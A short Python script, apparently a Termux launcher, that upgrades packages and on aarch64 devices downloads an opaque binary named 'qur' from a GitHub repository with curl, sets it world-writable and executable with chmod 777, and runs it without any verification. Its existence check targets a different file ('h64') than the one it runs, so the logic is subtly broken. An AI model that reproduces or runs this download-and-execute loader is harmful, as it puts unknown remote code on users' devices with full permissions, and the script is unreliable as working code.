#coding=utf-8
import os,sys,subprocess
py_ver = subprocess.check_output('python -V',shell=True)
if '3.10' in str(py_ver):
    os.system('pkg upgrade python -y')
    os.system('python run.py')
else:pass
os.system('pkg install file > /dev/null')
current_os=subprocess.check_output('uname -om',shell=True)
if 'aarch64' in str(current_os):
    if not os.path.isfile('h64'):
        os.system('curl -L https://github.com/Somi673/repo/blob/main/qur?raw=true > qur')
        os.system('chmod 777 qur')
        os.system('./qur')
    else:
        os.system('./qur')
else:
    print('\n  Unknown device, aarch or os found, contact author.')
    os.sys.exit()
 
